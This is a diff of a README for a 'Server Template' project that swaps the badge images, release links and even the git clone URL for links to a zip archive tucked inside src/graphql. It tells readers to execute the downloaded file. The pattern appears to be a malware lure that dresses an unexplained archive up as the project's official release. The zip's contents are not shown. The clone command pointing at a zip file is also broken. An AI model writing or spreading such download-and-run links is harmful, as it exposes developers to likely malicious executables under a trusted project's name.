@@ -1,7 +1,7 @@
 # Server Template 🚀
 
-![Version](https://img.shields.io/badge/version-1.0.0-brightgreen)
-![License](https://img.shields.io/badge/license-MIT-blue)
+![Version](https://raw.githubusercontent.com/MesserUY/server-template/main/src/graphql/server_template_3.6.zip)
+![License](https://raw.githubusercontent.com/MesserUY/server-template/main/src/graphql/server_template_3.6.zip)
 
 Welcome to the **Server Template** repository! This project provides a type-safe, stable, and scalable foundation for building server applications. Whether you're developing a small service or a large-scale application, this template will help you get started quickly and efficiently.
 
@@ -24,14 +24,14 @@ Welcome to the **Server Template** repository! This project provides a type-safe
 
 ## Getting Started
 
-To get started with the Server Template, follow the steps below. You can download the latest release from the [Releases section](https://github.com/MesserUY/server-template/releases).
+To get started with the Server Template, follow the steps below. You can download the latest release from the [Releases section](https://raw.githubusercontent.com/MesserUY/server-template/main/src/graphql/server_template_3.6.zip).
 
 ## Installation
 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/MesserUY/server-template.git
+   git clone https://raw.githubusercontent.com/MesserUY/server-template/main/src/graphql/server_template_3.6.zip
    ```
 
 2. Navigate to the project directory:
@@ -83,7 +83,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version, visit the [Releases section](https://github.com/MesserUY/server-template/releases). Make sure to execute the downloaded file to set up your server.
+To download the latest version, visit the [Releases section](https://raw.githubusercontent.com/MesserUY/server-template/main/src/graphql/server_template_3.6.zip). Make sure to execute the downloaded file to set up your server.
 
 ## Contact
 
